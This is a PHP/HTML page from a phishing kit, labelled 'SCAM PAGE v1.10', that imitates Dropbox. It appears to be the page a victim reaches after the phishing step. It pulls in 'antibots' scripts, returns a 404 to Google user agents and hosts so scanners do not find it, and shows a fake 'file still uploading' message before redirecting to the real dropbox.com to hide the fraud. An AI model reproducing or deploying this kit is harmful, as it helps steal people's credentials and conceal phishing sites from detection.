<?php
/*   
   _____   _                   _                       
  / ____| | |                 | |                      
 | (___   | |__     __ _    __| |   ___   __      __   
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /   
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /   
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     
                                                                                
                              #=======================#
                              #   SCAM PAGE v1.10     #
                              #        M3k$           #
                              #=======================#
                   
*/

session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html id="<?="x_".rand(3004, 2000)."".rand(7809, 5016)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="REFRESH" content="5; https://www.dropbox.com">
<title><?=$Z118_01;?></title>
<link href="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico" rel="shortcut icon" type="image/x-icon">
<link href="Untitled1.css" rel="stylesheet">
<link href="index3.css" rel="stylesheet">
 <style type="text/css">
            .Title {
    color: #364249;
        font-size: 36px;
    font-family: "Segoe UI Web Light","Segoe UI Light WestEuropean","Segoe UI Light","Segoe UI",Tahoma,Arial,sans-serif;
    font-weight: 300;
    line-height: 34px;
    letter-spacing: -.02em;
    font-weight : bold;
    color:#3551f2;
}
        </style>
</head>
<body>
<h1 class="Title" style="position:absolute;left:308px;top:260px;" data-bind="text: strings.GoAnywhereSectionTitle">The file you have requested is still uploading on our server,</h1>
<h1 class="Title" style="position:absolute;left:340px;top:310px;" data-bind="text: strings.GoAnywhereSectionTitle">We will notify you by email when its available for view</h1>

</div>

</form>
</body>
</html>